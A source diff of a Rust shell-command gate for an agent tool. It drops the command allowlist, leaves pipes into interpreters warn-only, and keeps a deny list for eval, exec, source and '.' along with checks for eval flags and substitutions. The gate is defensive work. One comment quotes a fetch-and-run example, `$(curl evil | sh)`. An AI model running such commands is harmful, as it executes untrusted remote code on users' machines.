@@ -1,14 +1,18 @@
-//! Shell allowlist with AST-based command parsing.
+//! Shell command gate with AST-based parsing.
 //!
-//! Security model (Information Bottleneck principle):
-//! - When allowlist is set: ALL segments of a compound command must be allowed (deny-by-default)
-//! - When empty: all commands pass (backwards-compatible blocklist-only mode)
-//! - Dangerous patterns (subshells, eval, backticks) are blocked in restricted mode
+//! Invariant 6: every command is allowed. What this module blocks is what a
+//! deny list cannot express — `eval`/`exec`/`source`/`.`, inline environment
+//! assignment, interpreter eval flags (`python -c`), and dangerous flags.
+//!
+//! The parser splits a compound command down to its leaves — pipelines, `&&`,
+//! subshells, brace groups, `case` arms, heredocs — so a blocked command
+//! cannot hide inside a construct. When a command does not parse, the checks
+//! run on the shallow segments instead: sobre never refuses a command because
+//! it could not read it.
 
 mod case_construct;
 mod heredoc;
 mod mode;
-mod substitution;
 #[cfg(test)]
 mod tests;
 #[cfg(test)]
@@ -22,11 +26,6 @@ pub(crate) use heredoc::heredoc_delims;
 pub use heredoc::strip_all_heredoc_bodies;
 pub(crate) use heredoc::{strip_comments, strip_quoted_heredoc_bodies};
 pub use mode::ShellSecurity;
-pub(crate) use substitution::check_substitution_in_args;
-#[cfg(test)]
-pub(crate) use substitution::has_expanding_substitution_in_args;
-#[cfg(test)]
-pub(crate) use tests::allow;
 
 /// Checks whether a command may run, honouring the active [`ShellSecurity`] mode
 /// (GL #788). This is the single chokepoint shared by MCP `ctx_shell` and the
@@ -35,11 +34,11 @@ pub(crate) use tests::allow;
 /// - [`ShellSecurity::Off`] → always `Ok` (gating skipped; compression intact).
 /// - [`ShellSecurity::Warn`] → run the checks, log any violation, return `Ok`.
 /// - [`ShellSecurity::Enforce`] → block on violation (the secure default).
-pub fn check_shell_allowlist(command: &str) -> Result<(), ShellError> {
+pub fn check_shell_command(command: &str) -> Result<(), ShellError> {
     match ShellSecurity::resolve() {
         ShellSecurity::Off => Ok(()),
         ShellSecurity::Warn => {
-            if let Err(msg) = enforce_shell_allowlist(command) {
+            if let Err(msg) = enforce_shell_gate(command) {
                 tracing::warn!(
                     target: "shell_security",
                     "warn-only: would block ({})",
@@ -48,7 +47,7 @@ pub fn check_shell_allowlist(command: &str) -> Result<(), ShellError> {
             }
             Ok(())
         }
-        ShellSecurity::Enforce => enforce_shell_allowlist(command),
+        ShellSecurity::Enforce => enforce_shell_gate(command),
     }
 }
 
@@ -65,16 +64,16 @@ pub fn check_shell_allowlist(command: &str) -> Result<(), ShellError> {
 /// just as wrong as blocking it would be in `enforce`.
 #[must_use]
 pub fn passes_enforced(command: &str) -> bool {
-    enforce_shell_allowlist(command).is_ok()
+    enforce_shell_gate(command).is_ok()
 }
 
 /// Allowlist + dangerous-pattern enforcement, evaluated as if in `enforce` mode.
-/// [`check_shell_allowlist`] decides whether a violation blocks, warns, or is
+/// [`check_shell_command`] decides whether a violation blocks, warns, or is
 /// skipped based on the active [`ShellSecurity`] mode.
 ///
 /// When the allowlist is empty, all commands pass (blocklist-only mode).
 /// When non-empty, EVERY command segment in the pipeline must match.
-fn enforce_shell_allowlist(command: &str) -> Result<(), ShellError> {
+fn enforce_shell_gate(command: &str) -> Result<(), ShellError> {
     let normalized = normalize_line_continuations(command);
     // #876: a quoted-delimiter heredoc body (`<<'EOF' … EOF`) is literal stdin
     // data, not commands. Strip it before analysis so the operator-splitter can't
@@ -103,16 +102,15 @@ fn enforce_shell_allowlist(command: &str) -> Result<(), ShellError> {
         .into());
     }
 
-    let strict = crate::core::config::Config::load().shell_strict_mode;
-    check_substitution_in_args(cmd, strict)?;
-    check_pipe_to_bare_interpreter(cmd, strict)?;
+    check_pipe_to_bare_interpreter(cmd);
 
-    let allowlist = effective_allowlist();
-    if allowlist.is_empty() {
-        check_unconditional_blocked_only(cmd_all)?;
-        return Ok(());
-    }
-    check_all_segments(cmd_all, &allowlist)
+    // Invariant 6: nothing is gated by name. What remains are the checks a deny
+    // list cannot express — shell builtins that hide a command from inspection,
+    // inline environment assignment, interpreter eval flags, dangerous flags.
+    // `check_unconditional_blocked_only` is the shape the phase-2 deny list
+    // extends: walk the segments, test each base against a list, block with a
+    // reason. Today that list is a four-entry const.
+    check_unconditional_blocked_only(cmd_all)
 }
 
 /// Normalize the command string: remove backslash-newline continuations and
@@ -124,50 +122,66 @@ fn normalize_line_continuations(command: &str) -> String {
         .replace(['\u{2028}', '\u{2029}'], "\n")
 }
 
-/// Piping into a bare interpreter (no script file): warn by default, **block**
-/// when `shell_strict_mode = true` (GH #391).
-fn check_pipe_to_bare_interpreter(command: &str, strict: bool) -> Result<(), ShellError> {
-    let segments = split_on_operators(command);
-
-    for (idx, seg) in segments.iter().enumerate() {
+/// Detect `… | sh` and friends: code arrives on stdin, so nothing here can see
+/// what actually runs. Reported, never blocked — invariant 6 puts that call
+/// with the developer, and `shell_strict_mode` (the knob that used to block
+/// it) is gone. Whether this deserves to join the unconditional blocks is open.
+fn check_pipe_to_bare_interpreter(command: &str) {
+    for (idx, seg) in split_on_operators(command).iter().enumerate() {
         if idx == 0 {
             continue;
         }
         if is_bare_interpreter_stdin(seg) {
             let base = extract_base_from_segment(seg);
-            if strict {
-                tracing::warn!(
-                    "[SECURITY] Pipe to bare interpreter '{base}' blocked (shell_strict_mode=true)"
-                );
-                return Err(format!(
-                    "[BLOCKED — DO NOT RETRY] Piping into bare interpreter '{base}' is blocked \
-                     because shell_strict_mode = true. Run a script file instead.\n\
-                     Command: {command}"
-                )
-                .into());
-            }
-            tracing::warn!("[SECURITY] Pipe to bare interpreter '{base}' detected (warn-only)");
+            tracing::warn!(
+                "[SECURITY] pipe into bare interpreter '{base}' — code on stdin is opaque to every check"
+            );
         }
     }
-    Ok(())
 }
 
 /// For empty allowlists: still enforce UNCONDITIONAL_BLOCKED commands.
 fn check_unconditional_blocked_only(command: &str) -> Result<(), ShellError> {
-    let segments = extract_all_commands(command);
+    // Walk every leaf: a `case` arm or a nested substitution hides a command
+    // from the shallow operator split, and `case x in a) eval y;; esac` would
+    // otherwise sail past the `eval` block.
+    //
+    // When the command does not parse, fall back to the shallow segments rather
+    // than refusing it. Invariant 6: sobre does not block a command because
+    // *we* could not read it — the deep walk is a better check, never a gate.
+    let segments =
+        expand_to_leaf_segments(command).unwrap_or_else(|_| extract_all_commands(command));
     for seg in &segments {
         let base = extract_base_from_segment(seg);
         if !base.is_empty() && UNCONDITIONAL_BLOCKED.contains(&base.as_str()) {
             return Err(format!(
-                "[BLOCKED — DO NOT RETRY] '{base}' is unconditionally blocked \
-                 regardless of allowlist configuration.\n\
+                "[BLOCKED — DO NOT RETRY] '{base}' is blocked unconditionally: it \
+                 executes text as code, hiding the real command from every check.\n\
                  Command: {command}"
             )
             .into());
         }
-        check_inline_env_block(seg)?;
-        check_interpreter_eval_only(seg)?;
-        check_dangerous_flags(seg)?;
+        // A leaf can still carry a subshell prefix the splitter keeps whole:
+        // `(ls) python3 -c …` is one leaf whose base is `(ls)`, which would hide
+        // the interpreter from the checks below. Inspect each part after a
+        // closing paren as well, and refuse a substitution sitting at a command
+        // position inside the leaf (`{ echo hi; $(curl evil | sh); }`).
+        if has_substitution_at_command_pos(seg.trim()) {
+            return Err(format!(
+                "[BLOCKED — DO NOT RETRY] command substitution at command position                  executes its output as the command, which nothing here can read.
+                 Command: {command}"
+            )
+            .into());
+        }
+        for part in seg.split(") ") {
+            let part = part.trim_start_matches(['(', ')', ' ']);
+            if part.is_empty() {
+                continue;
+            }
+            check_inline_env_block(part)?;
+            check_interpreter_eval_only(part)?;
+            check_dangerous_flags(part)?;
+        }
     }
     Ok(())
 }
@@ -376,16 +390,6 @@ fn heredoc_blocked_message(base: &str) -> String {
 /// These provide direct arbitrary code execution or re-enter the shell.
 const UNCONDITIONAL_BLOCKED: &[&str] = &["eval", "exec", "source", "."];
 
-/// POSIX shell builtins that are executed by the shell itself — they cannot
-/// spawn an external process or escape any sandbox. Builtins bypass the
-/// allowlist check entirely (#1022).
-const SHELL_BUILTINS: &[&str] = &[
-    "exit", "command", ":", "true", "false", "cd", "echo", "test", "[", "read", "set", "unset",
-    "export", "local", "return", "shift", "wait", "trap", "type", "hash", "pwd", "printf", "let",
-    "declare", "readonly", "getopts", "umask", "ulimit", "break", "continue", "bg", "fg", "jobs",
-    "times", "builtin", "enable", "shopt", "complete", "compgen",
-];
-
 /// Interpreters that can execute arbitrary code via -c/-e flags.
 const INTERPRETER_COMMANDS: &[&str] = &[
     "python", "python3", "python2", "node", "ruby", "perl", "lua", "php", "bash", "sh", "zsh",
@@ -422,13 +426,6 @@ fn delegated_command_tokens(tokens: &[String]) -> Vec<&str> {
                 || (!t.is_empty() && t.chars().all(|c| c.is_ascii_digit()))
         })
         .collect()
-}
-
-/// Check if a segment uses an interpreter with an eval flag, or a delegation command
-/// whose target is not in the allowlist.
-fn check_interpreter_abuse(segment: &str, allowlist: &[String]) -> Result<(), ShellError> {
-    let inline_ok = crate::core::config::Config::load().shell_allow_inline_scripts_effective();
-    check_interpreter_inner(segment, Some(allowlist), 0, inline_ok)
 }
 
 /// Check for combined flags like -pe, -ne, -ce that contain eval characters.
@@ -589,9 +586,8 @@ fn expand_to_leaf_segments(command: &str) -> Result<Vec<String>, ShellError> {
     let command = rewrite_case_constructs(command)?;
     if find_shell_word(&command, "esac", 0).is_some() || contains_double_semicolon(&command) {
         return Err(format!(
-            "[BLOCKED — DO NOT RETRY] Unparsed case-arm terminator or `esac` \
-             construct cannot be leaf-validated safely in restricted (allowlisted) \
-             shell mode. Run a script file or disable the allowlist instead.\n\
+            "unparsed case-arm terminator or `esac`; the caller falls back to \
+             shallow segments.\n\
              Command: {command}"
         )
         .into());
@@ -947,119 +943,6 @@ fn balanced_brace_inner(segment: &str) -> Option<&str> {
     None
 }
 
-/// #813: check whether a command token resolves to an existing file under the
-/// project root. Called as a fallback when the base command name isn't in the
-/// allowlist — agents frequently build project-local binaries (`go build -o
-/// cbc_old`, `cargo build`, `gcc -o bench`) that shouldn't require a manual
-/// `lean-ctx allow` round-trip.
-///
-/// Only auto-allows when ALL of:
-/// 1. The token is a path (contains `/` or starts with `./`)
-/// 2. The resolved path is an existing file
-/// 3. The resolved path is under the project root
-fn is_project_root_binary(token: &str) -> bool {
-    if !token.contains('/') {
-        return false;
-    }
-    let path = std::path::Path::new(token);
-    let resolved = if path.is_relative() {
-        match std::env::current_dir() {
-            Ok(cwd) => cwd.join(path),
-            Err(_) => return false,
-        }
-    } else {
-        path.to_path_buf()
-    };
-    let Ok(canonical) = resolved.canonicalize() else {
-        return false;
-    };
-    if !canonical.is_file() {
-        return false;
-    }
-    let Some(root) = crate::server::derive_project_root_from_cwd() else {
-        return false;
-    };
-    let root_path = std::path::Path::new(&root);
-    let canonical_root = root_path
-        .canonicalize()
-        .unwrap_or_else(|_| root_path.to_path_buf());
-    canonical.starts_with(&canonical_root)
-}
-
-fn check_all_segments(command: &str, allowlist: &[String]) -> Result<(), ShellError> {
-    if allowlist.is_empty() {
-        return Ok(());
-    }
-
-    if has_dangerous_patterns(command) {
-        return Err(format!(
-            "[BLOCKED — DO NOT RETRY] Command uses eval or $()/ backticks at command position, \
-             which is blocked in restricted mode. \
-             This is a permanent security restriction, not a transient error.\n\
-             Command: {command}"
-        )
-        .into());
-    }
-
-    let segments = expand_to_leaf_segments(command)?;
-    if segments.is_empty() {
-        return Err("[BLOCKED — DO NOT RETRY] Empty command".into());
-    }
-
-    let total = segments.len();
-    for (idx, seg) in segments.iter().enumerate() {
-        check_inline_env_block(seg)?;
-        let base = extract_base_from_segment(seg);
-        if base.is_empty() {
-            continue;
-        }
-        if UNCONDITIONAL_BLOCKED.contains(&base.as_str()) {
-            return Err(format!(
-                "[BLOCKED — DO NOT RETRY] '{base}' is unconditionally blocked \
-                 regardless of allowlist membership. \
-                 This is a permanent security restriction.\n\
-                 Command: {command}"
-            )
-            .into());
-        }
-        if SHELL_BUILTINS.contains(&base.as_str()) {
-            continue;
-        }
-        check_interpreter_abuse(seg, allowlist)?;
-        check_dangerous_flags(seg)?;
-        if !allowlist.iter().any(|a| a == &base) {
-            // #813: auto-allow binaries that resolve to existing files under
-            // the project root. The first token (before rsplit) carries the
-            // path context (e.g. "./cbc_old", "../bin/bench").
-            let first_token = shell_tokenize(skip_env_assignments(seg.trim()))
-                .into_iter()
-                .next()
-                .unwrap_or_default();
-            if is_project_root_binary(&first_token) {
-                tracing::info!(
-                    "[shell_allowlist] auto-allowing project-root binary: {first_token}"
-                );
-                continue;
-            }
-
-            // #815: for compound commands, tell the user which segment was
-            // blocked and that nothing ran (the pipeline is rejected as a
-            // whole before execution, so no prefix commands executed).
-            let mut msg = allowlist_block_message(&base);
-            if total > 1 {
-                msg.push_str(&format!(
-                    "\n\n[pipeline: segment {}/{total} blocked — \
-                     the entire command was rejected before execution, \
-                     no part of the pipeline ran]",
-                    idx + 1,
-                ));
-            }
-            return Err(msg.into());
-        }
-    }
-    Ok(())
-}
-
 /// Detect dangerous shell patterns that bypass allowlist intent.
 ///
 /// Only blocks patterns that are genuinely dangerous at command position.
@@ -1075,7 +958,10 @@ fn has_dangerous_patterns(command: &str) -> bool {
         if trimmed.starts_with(&with_space) {
             return true;
         }
-        for sep in ["; ", "&& ", "|| ", "| ", "\n"] {
+        // `) ` closes a subshell: `(true) eval x` puts `eval` at a command
+        // position the leaf walk does not split on, which is how it slipped
+        // past the base-name check.
+        for sep in ["; ", "&& ", "|| ", "| ", ") ", "\n"] {
             if trimmed.contains(&format!("{sep}{blocked} ")) {
                 return true;
             }
@@ -1314,117 +1200,9 @@ fn skip_env_assignments(segment: &str) -> &str {
     }
 }
 
-fn effective_allowlist() -> Vec<String> {
-    // LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE completely replaces the config (for testing)
-    if let Ok(ov) = std::env::var("LEAN_CTX_SHELL_ALLOWLIST_OVERRIDE") {
-        return ov
-            .split(',')
-            .map(|s| s.trim().to_string())
-            .filter(|s| !s.is_empty())
-            .collect();
-    }
-    let cfg = crate::core::config::Config::load();
-    let mut list = cfg.shell_allowlist;
-    // `shell_allowlist_extra` is purely additive (written by `lean-ctx allow <cmd>`),
-    // so users can permit a command without nuking the built-in defaults. It only
-    // matters in restricted mode — when the base list is empty all commands pass anyway.
-    if !list.is_empty() {
-        for entry in cfg.shell_allowlist_extra {
-            if !entry.is_empty() && !list.contains(&entry) {
-                list.push(entry);
-            }
-        }
-    }
-    if let Ok(env_val) = std::env::var("LEAN_CTX_SHELL_ALLOWLIST") {
-        for entry in env_val
-            .split(',')
-            .map(|s| s.trim().to_string())
-            .filter(|s| !s.is_empty())
-        {
-            if !list.contains(&entry) {
-                list.push(entry);
-            }
-        }
-    }
-    list
-}
-
-/// Builds the actionable, self-diagnosing message shown when a command's base binary
-/// is not in the allowlist. Unlike a bare "not allowed" string, it tells the user
-/// (1) the exact additive fix, (2) the real config path the MCP server reads, and
-/// (3) — crucially — whether their `config.toml` silently failed to parse (in which
-/// case lean-ctx is on defaults, which is the usual reason an allowlist edit "did
-/// nothing"). That last signal is otherwise invisible over an MCP/stdio transport.
-fn allowlist_block_message(base: &str) -> String {
-    let cfg_path = crate::core::config::Config::path().map_or_else(
-        || "~/.lean-ctx/config.toml".to_string(),
-        |p| p.display().to_string(),
-    );
-
-    let mut msg = format!(
-        "[BLOCKED — DO NOT RETRY] '{base}' is not in the shell allowlist. \
-         This is a permanent restriction, not a transient error.\n\
-         Fix (additive, keeps the defaults): run  lean-ctx allow {base}\n\
-         Config in effect: {cfg_path}\n\
-         Or disable the allowlist entirely: set  shell_allowlist = []\n\
-         Or turn off all shell gating (you own the risk): set  shell_security = \"off\"  \
-         (or env LEAN_CTX_SHELL_SECURITY=off) — compression still applies.\n\
-         Do NOT reroute through ctx_execute(language=\"shell\"): both tools enforce the same \
-         policy. Allow the command explicitly or change shell_security deliberately."
-    );
-
-    if crate::core::config::cloud_infra_commands().contains(&base) {
-        msg.push_str(
-            "\nNote: cloud/infra CLIs (terraform, kubectl, aws, …) are deliberately \
-             excluded from the defaults — they mutate remote infrastructure with \
-             ambient credentials. Opting in is a deliberate user decision.",
-        );
-    }
-
-    if let Some(parse_err) = crate::core::config::last_config_parse_error() {
-        msg.push_str(&format!(
-            "\n\n⚠ Your config.toml currently FAILS to parse, so lean-ctx is running on the \
-             built-in defaults — this is almost certainly why editing the allowlist had no \
-             effect. Fix the TOML error below, then retry:\n  {parse_err}\n  File: {cfg_path}"
-        ));
-    } else if let Some(missing) = crate::core::config::Config::missing_config_path() {
-        // The resolved config doesn't exist → lean-ctx is on defaults. An edit
-        // made to a config.toml in a different dir (XDG vs legacy ~/.lean-ctx) or
-        // under a sandboxed/container HOME is never read — say so over MCP (#540).
-        msg.push_str(&format!(
-            "\n\n⚠ No config file exists at {} — lean-ctx is running on built-in defaults. \
-             If you added the command to a config.toml in a DIFFERENT location (XDG \
-             ~/.config/lean-ctx vs legacy ~/.lean-ctx, or your MCP client launches lean-ctx \
-             in a sandbox/container with a different HOME), the runtime never reads it. \
-             `lean-ctx doctor` prints the path actually in effect; pin it with \
-             LEAN_CTX_CONFIG_DIR.",
-            missing.display()
-        ));
-    }
-
-    // A project-local `shell_allowlist`/`shell_allowlist_extra` is silently
-    // withheld for an untrusted workspace; surface that here so the edit's
-    // no-op reason isn't buried in an MCP-invisible stderr warning (#540).
-    if let Some(notice) = crate::core::workspace_trust::untrusted_override_notice() {
-        msg.push_str("\n\n⚠ ");
-        msg.push_str(&notice);
-    }
-
-    msg
-}
-
 /// Public accessor for extracting all command segments.
 pub fn extract_all_commands_pub(command: &str) -> Vec<String> {
     extract_all_commands(command)
-}
-
-/// Public accessor: the fully-resolved allowlist actually enforced by the MCP tools
-/// (base `shell_allowlist` + additive `shell_allowlist_extra` + env), deduplicated.
-/// Empty means blocklist-only mode (all commands pass). Used by `lean-ctx allow`
-/// and `lean-ctx doctor` to show users exactly what the runtime sees.
-#[must_use]
-pub fn effective_allowlist_pub() -> Vec<String> {
-    effective_allowlist()
 }
 
 // Legacy compat: single-segment extraction (used by other callers)
